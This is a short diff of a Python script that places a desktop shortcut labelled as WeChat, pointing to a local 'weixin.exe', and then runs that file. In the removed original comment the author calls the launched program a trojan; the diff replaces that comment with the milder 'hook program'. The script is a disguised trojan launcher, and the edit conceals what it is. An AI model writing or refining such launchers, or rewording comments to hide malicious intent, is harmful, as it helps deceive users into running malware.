@@ -21,13 +21,13 @@ def createDesktopLnk(filename,lnkname):
     shortcut.QueryInterface(pythoncom.IID_IPersistFile).Save(lnkname,0)
 
 if __name__ == '__main__':
-    #获取当前目录
-    path=pwd = os.getcwd()
-    #创建快捷方式
-    path=path+u'\weixin.exe'
-    title=u'微信'
+    # get current directory
+    path = pwd = os.getcwd()
+    # create shotcut
+    path = path+u'\weixin.exe'
+    title = u'微信'
     type = sys.getfilesystemencoding()
     createDesktopLnk(path, title)
-    #启动木马程序
+    # start this hook program
     win32api.ShellExecute(0, 'open', path, '', '', 1)
     print '创建快捷方式自启动完毕'
